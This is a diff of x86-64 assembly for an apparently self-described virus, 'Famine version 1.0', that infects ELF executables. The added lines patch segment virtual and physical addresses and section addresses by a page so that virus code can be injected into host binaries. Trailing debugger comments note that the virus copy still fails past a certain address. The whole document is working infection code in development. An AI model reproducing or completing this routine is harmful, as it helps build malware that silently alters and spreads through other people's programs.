@@ -284,10 +284,17 @@ _file:
 	.patch_segments:
 	add rax, elf64_phdr_size								; Go to next segment
 	mov rdi, rax
-	add rdi, elf64_phdr.p_offset							; p_offset += PAGE_SIZE
+	add rdi, elf64_phdr.p_offset							; p_offset += PAGE_SIZE			can be optimised by an add qword like sections
 	mov rsi, [rdi]
 	add rsi, PAGE_SIZE
 	mov [rdi], rsi
+	add rdi, elf64_phdr.p_vaddr - elf64_phdr.p_offset		; p_vaddr += PAGE_SIZE
+	mov rsi, [rdi]
+	add rsi, PAGE_SIZE
+	mov [rdi], rsi
+	add rdi, elf64_phdr.p_paddr - elf64_phdr.p_vaddr
+	add qword [rdi], PAGE_SIZE
+	
 	inc r13
 	cmp r13, r14											; r14 still has e_phnum. We check if we patched all segments
 	jne .patch_segments										; If not, loop
@@ -313,6 +320,8 @@ _file:
 	cmp r13, rsi												; If the offset of the section is after the injection point...
 	jge .pass
 	add qword [rdi], PAGE_SIZE									; We add 4096 to their offset, since their content will be shifted
+	sub rdi, 0x8
+	add qword [rdi], PAGE_SIZE									; adding PAGE_SIZE to virtual addresses of sections too
 	.pass:
 	inc r10
 	cmp r10, r14
@@ -434,3 +443,10 @@ signature	db		"Famine version 1.0 (c)oded by qroland",0x0
 host_entry	dq		_exit
 virus_entry	dq		_start
 _finish:
+
+
+
+; x /120i 0x555555569bf1
+
+; shortly after 0x555555569fc8, the virus isn't properly copied (more precisely, right after 0x555555569ff3)
+; 
